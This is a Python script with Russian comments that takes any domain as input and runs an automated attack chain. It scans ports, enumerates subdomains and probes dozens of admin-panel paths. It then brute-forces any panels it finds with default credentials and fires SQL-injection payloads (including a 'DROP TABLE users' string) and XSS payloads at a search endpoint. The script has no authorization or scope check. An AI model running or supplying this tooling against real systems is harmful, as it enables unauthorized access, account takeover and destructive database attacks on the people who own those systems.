import socket
import requests
from urllib.parse import urljoin
import datetime
import os

# =============================
# Настройки
# =============================
SUBDOMAINS = [
    "admin", "mail", "ftp", "cpanel", "webmail", "test", "dev", "beta", "stage", "secure",
    "portal", "login", "ns1", "ns2", "smtp", "pop", "imap", "vpn", "intranet", "extranet",
    "vpn1", "remote", "db", "database", "host", "www1", "web", "api", "api1", "gateway",
    "securemail", "blog", "news", "support", "cdn", "img", "files", "cdn1", "static",
    "images", "upload", "downloads", "repo", "git", "gitlab", "jira", "monitor", "status",
    "billing", "devops", "engine", "crm", "erp", "cloud", "console", "adminpanel"
]

PORTS = list(range(20, 1025)) + [8080, 8443]

ADMIN_PATHS = [
    "admin", "admin/login", "admin1", "admin2", "admin_area", "adminLogin",
    "administrator", "cpanel", "dashboard", "user", "users", "login", "log-in",
    "panel", "admin.php", "login.php", "wp-login.php", "admin.asp", "admin.aspx",
    "admin.html", "admin.htm", "admin/cp", "adminControl", "adm", "admin_console",
    "admin_login", "auth", "backend", "controlpanel", "cms", "members", "member",
    "moderator", "secure", "siteadmin", "sysadmin", "system", "login/admin",
    "adminarea", "wp-admin", "admin_site", "loginpanel", "manage", "management",
    "portal", "root", "superadmin", "useradmin", "users/login", "signin",
    "admin/index", "account", "accounts", "config", "control", "core", "webadmin",
    "private", "staff", "secureadmin", "access", "admin/home", "admin/main",
    "login/adminLogin", "admincontrol", "admindashboard", "directadmin", "adminlogin",
    "adminpanel", "adminsite", "member/login", "webmaster", "site/login", "adminarea/login"
]

INJECTION_PAYLOADS_SQL = [
    "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "' OR 'a'='a", "'; DROP TABLE users;--",
    "1' AND 1=1--", "admin' --", "admin' #", "' OR 1=1#", "' OR '1'='1' --", "\" OR 1=1#", "OR 1=1", "' or 1=1--", "' or 'a'='a"
]

INJECTION_PAYLOADS_XSS = [
    "<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert('XSS')>",
    "<body onload=alert(1)>", "'\"><script>alert(1)</script>", "<iframe src=javascript:alert(1)>",
    "<math href=\"javascript:alert(1)\">CLICK", "<object data=javascript:alert(1)>", "<a href='javascript:alert(1)'>link</a>"
]

CREDENTIALS = [
    ("admin", "admin"), ("root", "toor"), ("admin", "1234"), ("admin", "password"),
    ("admin", "123456"), ("test", "test"), ("user", "user"), ("admin", "qwerty"),
    ("admin", "admin123"), ("admin", "1")
]

LOG_DIR = "logs"

# =============================
# Ввод домена
# =============================
domain = input("Введите домен (например, example.com): ").strip()
now = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M")
log_file = os.path.join(LOG_DIR, f"{domain}_{now}.txt")
os.makedirs(LOG_DIR, exist_ok=True)

def log(msg):
    print(msg)
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(msg + "\n")

log(f"\n[+] Подключение к: {domain}")
try:
    ip = socket.gethostbyname(domain)
    log(f"[+] IP адрес: {ip}")
except:
    log("[!] Не удалось получить IP")
    exit()

# =============================
# Скан портов
# =============================
log("\n[+] Скан портов:")
for port in PORTS:
    s = socket.socket()
    s.settimeout(0.5)
    try:
        s.connect((ip, port))
        log(f" [+] Открыт порт: {port}")
        s.close()
    except:
        pass

# =============================
# Поддомены
# =============================
log("\n[+] Поиск поддоменов:")
for sub in SUBDOMAINS:
    try:
        subdomain = f"{sub}.{domain}"
        socket.gethostbyname(subdomain)
        log(f" [+] Найден поддомен: {subdomain}")
    except:
        pass

# =============================
# Поиск admin панелей
# =============================
log("\n[+] Поиск admin панелей:")
found_panels = []
for path in ADMIN_PATHS:
    for scheme in ["http", "https"]:
        url = f"{scheme}://{domain}/{path}"
        try:
            r = requests.get(url, timeout=5, allow_redirects=True)
            if r.status_code in [200, 301, 302, 403]:
                log(f" [+] Найдена панель: {url} [{r.status_code}]")
                found_panels.append(url)
        except:
            continue

# =============================
# Попытка входа
# =============================
log("\n[+] Попытка входа:")
for panel_url in found_panels:
    try:
        baseline = requests.get(panel_url, timeout=5).text.lower()
    except:
        continue

    for username, password in CREDENTIALS:
        try:
            r = requests.post(panel_url, data={"username": username, "password": password}, timeout=5, allow_redirects=True)
            body = r.text.lower()
            if "logout" in body or "dashboard" in body or ("login" not in body and len(body) != len(baseline)):
                log(f" [✔] Возможно успешный вход: {username}:{password} --> {panel_url}")
                break
            elif "invalid" in body or "incorrect" in body or "error" in body:
                log(f" [-] Неверный: {username}:{password}")
        except:
            continue

# =============================
# SQL инъекция
# =============================
log("\n[+] Тест SQL-инъекций:")
for payload in INJECTION_PAYLOADS_SQL:
    try:
        test_url = f"http://{domain}/search?q={payload}"
        r = requests.get(test_url, timeout=3)
        if "error" in r.text.lower() or "sql" in r.text.lower():
            log(f" [!] Возможна SQL-инъекция: {test_url} [payload={payload}]")
    except:
        pass

# =============================
# XSS инъекция
# =============================
log("\n[+] Тест XSS-инъекций:")
for payload in INJECTION_PAYLOADS_XSS:
    try:
        xss_url = f"http://{domain}/search?q={payload}"
        r = requests.get(xss_url, timeout=3)
        if payload in r.text:
            log(f" [!] Уязвимость XSS: {xss_url}")
    except:
        pass

log("\n[✔] Сканирование завершено.")
